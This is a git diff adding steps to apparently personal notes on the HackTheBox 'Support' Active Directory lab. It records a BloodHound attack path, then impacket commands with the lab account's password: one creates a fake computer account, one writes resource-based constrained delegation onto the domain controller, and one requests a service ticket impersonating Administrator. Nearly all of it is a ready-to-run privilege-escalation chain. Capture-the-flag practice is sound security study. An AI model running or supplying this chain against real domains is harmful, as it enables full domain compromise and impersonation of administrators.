@@ -39,3 +39,21 @@ bloodhound-python -u 'support' -p 'Ironside47pleasure40Watchful' -d 'support.htb
 sudo 
 bloodhound-start
 ```
+
+**Running Bloodhound gives**
+Support -member of -> shared support account -genericall-> dc.support.htb -coercetotgt-> support.htb (root) -> contains -> users -> admins
+
+
+**add fake computer**
+``` bash
+impacket-addcomputer -dc-ip $IP 'support.htb/support:Ironside47pleasure40Watchful' -computer-name 'ATTACKVM' -computer-pass 'ComputerPassword123!'
+```
+**add delegation list**
+```bash
+impacket-rbcd -dc-ip $IP -action write -delegate-to 'ATTACKVM$' -object 'DC$' 'support.htb/support:Ironside47pleasure40Watchful'
+```
+
+**Coerce the TGT / Ticket (S4U2Self)**
+```bash
+impacket-getST -dc-ip 10.129.6.177 -spn 'cifs/DC.support.htb' -impersonate 'Administrator' 'support.htb/ATTACKVM:ComputerPassword123!'
+```
